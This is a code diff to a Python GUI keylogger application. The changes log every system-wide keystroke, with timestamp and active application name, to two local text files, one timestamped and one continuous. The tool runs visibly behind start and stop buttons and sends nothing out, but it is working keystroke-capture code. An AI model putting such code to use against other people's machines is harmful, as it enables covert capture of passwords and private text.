@@ -31,7 +31,8 @@ class KeyloggerApp:
 
         self.listener = None
         self.is_logging = False
-        self.log_file = 'keystrokes.txt'
+        self.log_file_individual = 'keystrokes_individual.txt'
+        self.log_file_continued = "keystrokes_continued.txt"
 
         # To capture and log words
         self.current_word = ''
@@ -55,7 +56,12 @@ class KeyloggerApp:
         try:
             key_char = key.char
         except AttributeError:
-            key_char = str(key)
+            if key == keyboard.Key.space:
+                key_char = " "
+            else:
+                key_char = str(key)
+
+        
 
         # Capture the keystroke
         self.current_word += key_char
@@ -64,15 +70,18 @@ class KeyloggerApp:
         self.text_box.insert(ctk.END, key_char)  # Changed to ctk.END
 
         # Save the keystroke to the log file with timestamp and application
-        with open(self.log_file, 'a') as file:
+        with open(self.log_file_individual, 'a') as file:
             file.write(f'{timestamp} | {application} | {key_char}\n')
+
+        with open(self.log_file_continued, "a") as file:
+            file.write(key_char)
 
 
         # Check if enough time has passed to treat the keystroke as part of the word
         if time.time() - self.last_key_time > self.debounce_time:
             # Log the word after debounce period
             if self.current_word:
-                with open(self.log_file, 'a') as file:
+                with open(self.log_file_individual, 'a') as file:
                     file.write(f'{timestamp} | {application} | Word: {self.current_word}\n')
 
                 self.current_word = ''  # Reset the word buffer
@@ -88,6 +97,7 @@ class KeyloggerApp:
         self.start_button.configure(state=ctk.DISABLED)
         self.stop_button.configure(state=ctk.NORMAL)
 
+        # TODO: Why do we do this?
         # Start the keylogger in a separate thread to avoid blocking the GUI
         self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
         threading.Thread(target=self.listener.start).start()
@@ -102,8 +112,11 @@ class KeyloggerApp:
 
     def clear_log(self):
         self.text_box.delete(1.0, ctk.END)
-        with open(self.log_file, 'w') as file:
+        with open(self.log_file_individual, 'w') as file:
             file.truncate(0)  # Clear the file content
+
+        with open(self.log_file_continued, "w") as file:
+            file.truncate(0)
 
 if __name__ == "__main__":
     # Initialize CustomTkinter Window
